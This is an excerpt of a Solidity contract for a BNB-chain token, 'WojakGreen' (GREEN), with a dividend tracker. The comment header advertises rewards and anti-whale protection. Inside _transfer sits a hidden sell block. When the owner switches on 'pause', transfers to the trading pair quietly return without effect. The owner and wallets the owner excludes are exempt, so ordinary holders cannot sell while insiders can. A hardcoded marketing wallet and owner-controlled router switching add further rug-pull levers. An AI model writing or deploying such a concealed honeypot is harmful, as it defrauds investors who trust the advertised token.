...
/*
    ...
    Telegram: https://t.me/WojakGreen

    # 7% to BNB rewards
    # 4% to marketing wallet
    # 3% to feed liquidity pool

    # Anti-whale & Anti-snipe proof
    - Max transaction size & max wallet size
    - Dumpers are punished                                                                                       
*/
...
contract GREENDividendTracker is DividendPayingToken, Ownable {
    ...
    function withdrawDividend() public override  pure {
        require(false, "GREEN_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main GREEN contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "GREEN_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "GREEN_Dividend_Tracker: Cannot update claimWait to same value");
...
contract WojakGreen is ERC20, Ownable {
    
    using SafeMath for uint256;

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    GREENDividendTracker public dividendTracker;

    address public _marketingWallet = 0x140C606Fc93d1AEa8cf6c0ce203248a38FF86f07;
    ...
    mapping (address => bool) public _isExcludedFromPause;
    ...
    constructor() ERC20("WojakGreen", "GREEN") {

    	dividendTracker = new GREENDividendTracker();
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "GREEN: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "GREEN: Account is already the value of 'excluded'");
    ...
    function excludeFromPause(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromPause[account] != excluded, "GREEN: Account is already the value of 'excluded'");
        _isExcludedFromPause[account] = excluded;

        emit ExcludeFromPause(account, excluded);
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "GREEN: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "GREEN: Cannot update gasForProcessing to same value");
    ...
    function setPause(bool newStatus) external onlyOwner {
        pause = newStatus;
    }
    ...
    function _transfer(address from, address to, uint256 amount ) internal override {
        ...
        if (from != owner() && !(_isExcludedFromPause[from]) && to == uniswapV2Pair && pause == true) {
            return;
        }
    ...
    function prepareForLaunch() external onlyOwner {
        ...
        maxTxAmount = 5000000000 * (10**9); // 5%
        walletMax = 10000000000 * (10**9); // 10%
    }
